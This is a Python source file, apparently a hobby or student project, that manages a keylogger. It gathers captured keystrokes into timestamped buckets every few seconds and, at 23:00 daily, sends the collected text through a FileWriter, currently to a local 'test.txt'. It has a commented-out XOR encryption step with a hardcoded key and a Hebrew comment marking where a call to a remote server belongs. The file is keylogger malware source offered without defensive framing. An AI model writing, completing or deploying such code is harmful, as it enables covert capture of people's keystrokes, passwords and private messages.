import time
from KeyLoggerService import KeyLoggerService
from FileWriter import FileWriter
from datetime import datetime
import threading
from XOR import Encryptor


class KeyLoggrManager:
    def __init__(self):
        self.keyLoggerService = KeyLoggerService()
        self.dic_key = {}

    def power_on(self):
        self.keyLoggerService.start_logging()
        self.thread_one = threading.Thread(target= self.to_dic , daemon= True)
        self.thread_one.start()
        self.up_data()


    def to_dic(self):
        while True:
            time.sleep(5)
            buffer = self.key_from_()
            buffer = "".join(buffer)

            now_time = datetime.now().strftime('%Y-%m-%d %H:%M')
            if now_time in self.dic_key:
                self.dic_key[now_time] += buffer
            else:
                self.dic_key[now_time] = [buffer]
            buffer = ""
            print(self.dic_key)


    def up_data(self):
        while True:
            time.sleep(5)
            if datetime.now().hour == 23:
                now = self.to_str()
                self.send(now)
                self.dic_key = {}


    def key_from_(self):
        return self.keyLoggerService.get_logged_keys()


    def to_str(self):
        a = ""
        for now_time,text in self.dic_key.items():
            a += f" {now_time}: {text}"
        return a


    def send(self,data):
        send_dat = FileWriter()
        # cri = Encryptor("s9bHZ6t7Ka1HK6f")
        # data = cri.encrypt(data)
        send_dat.send_data(data,"test.txt")
        #שורת קוד שפונה לשרת





a = KeyLoggrManager()
a.power_on()




